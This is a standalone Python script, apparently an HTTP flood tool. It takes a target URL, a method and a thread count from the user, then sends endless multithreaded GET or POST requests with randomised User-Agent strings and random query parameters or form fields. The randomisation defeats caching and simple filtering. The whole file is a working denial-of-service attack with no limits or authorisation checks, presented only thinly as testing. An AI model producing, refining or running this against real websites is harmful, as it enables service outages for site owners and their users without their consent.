import requests
import threading
import time
import random
import string

# User input
url = input("Enter target URL: ").strip()
method = input("Request method (GET/POST): ").strip().upper()
threads = int(input("Number of threads: "))
delay = float(input("Delay between requests (seconds): "))
quiet = input("Quiet mode? (y/n): ").strip().lower() == 'y'

# Generate random string
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Request function
def send_request():
    while True:
        try:
            full_url = url
            headers = {
                "User-Agent": f"TestAgent/{random.randint(1, 999999)}.{random_string(4)}",
                "Accept": "*/*"                                                                     }

            if method == "GET":
                full_url += "?" + random_string(6) + "=" + random_string(8)
                response = requests.get(full_url, headers=headers)
            elif method == "POST":
                data = {random_string(5): random_string(10)}
                response = requests.post(url, data=data, headers=headers)
            else:
                print("Unsupported HTTP method")
                return

            if not quiet:
                print(f"[{threading.current_thread().name}] {method} {full_url} - {response.status_code}")
        except Exception as e:
            if not quiet:
                print(f"[{threading.current_thread().name}] Error: {e}")
        time.sleep(delay)

# Launch threads
for i in range(threads):
    t = threading.Thread(target=send_request, name=f"Thread-{i+1}")
    t.daemon = True
    t.start()

# Keep main thread alive
while True:
    time.sleep(1)
